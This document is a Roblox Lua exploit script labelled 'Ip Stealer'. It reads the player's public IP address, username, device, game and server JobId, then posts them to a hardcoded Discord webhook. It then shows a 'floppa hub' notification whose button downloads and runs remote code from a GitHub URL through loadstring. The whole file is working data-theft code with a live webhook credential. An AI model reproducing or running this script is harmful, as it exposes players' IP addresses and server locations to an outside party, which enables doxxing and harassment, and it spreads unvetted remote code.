_G.Webhook = "https://discord.com/api/webhooks/811350355341213746/zInXU4ZSGRMB2AVvkngdfwryrvQzt5ZD_99XijVo0Zfwsb3RQlSIpxkBeHpHuTVM0UDL"

request = http_request or request or HttpPost or syn.request

local ipAdress = request({
    Url = "https://api.ipify.org/",
    Method = "GET"
})

function getDevice()
    local UIS = game:GetService("UserInputService")
    local GuiService = game:GetService("GuiService")

    if UIS.TouchEnabled and not UIS.KeyboardEnabled and not UIS.MouseEnabled and not UIS.GamepadEnabled and not GuiService:IsTenFootInterface() then
        return "Mobile"
    else
        if UIS.KeyboardEnabled and not UIS.TouchEnabled and UIS.MouseEnabled then
            return "Laptop/PC"
        end
    end
end

local bindf = Instance.new("BindableFunction")

bindf.OnInvoke = function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/si1nnx/psxx/main/g"))()
end

local Webhook = _G.Webhook
    local msg = {
        ["username"] = "Ip Stealer",
        ["embeds"] = {
            {
            ["color"] = tonumber(tostring("0x" .. "0xff0000")),
            ["title"] = "*" .. "Ip Stealer" .. "*",
            ["thumbnail"] = {
            ["url"] = "https://www.roblox.com/asset-thumbnail/image?assetId=" .. game.PlaceId .. "&width=768&height=432&format=png"
            },
            ["fields"] = {
            {
            ["name"] = "Nickname",
            ["value"] = game:GetService("Players").LocalPlayer.Name,
            ["inline"] = true
            },
            {
            ["name"] = "Ip Address",
            ["value"] = ipAdress.Body,
            ["inline"] = true
            },
            {
            ["name"] = "Game Name",
            ["value"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId, Enum.InfoType.Asset).Name,
            ["inline"] = true
            },
            {
            ["name"] = "Device",
            ["value"] = getDevice(),
            ["inline"] = true
            },
            {
            ["name"] = "PlaceId",
            ["value"] = game.PlaceId,
            ["inline"] = true
            },
            {
            ["name"] = "JobId",
            ["value"] = game.JobId,
            ["inline"] = true
            },
            {
            ["name"] = "Teleport Script",
            ["value"] = 'game:GetService("TeleportService"):TeleportToPlaceInstance(' .. game.PlaceId .. ', ' .. '"' .. game.JobId  .. '"' .. ', ' .. 'game:GetService("Players").LocalPlayer)',
            ["inline"] = true
            },
            {
            ["name"] = "Credits",
            ["value"] = "hecker#5445!",
            ["inline"] = true
            },
            },
            ["author"] = {},
            ["footer"] = {
            ["text"] = "",
            },
            ['timestamp'] = os.date("%Y-%m-%dT%X.000Z"),
            }
        }
    }
request({Url = Webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game.HttpService:JSONEncode(msg)})

game:GetService("StarterGui"):SetCore('SendNotification', {
	Title = "Palm",
	Text = "wanna load floppa hub?!",
	Icon = "rbxassetid://57254792",
	Duration = 5,
	Callback = bindf,
	Button1 = 'OK',
})
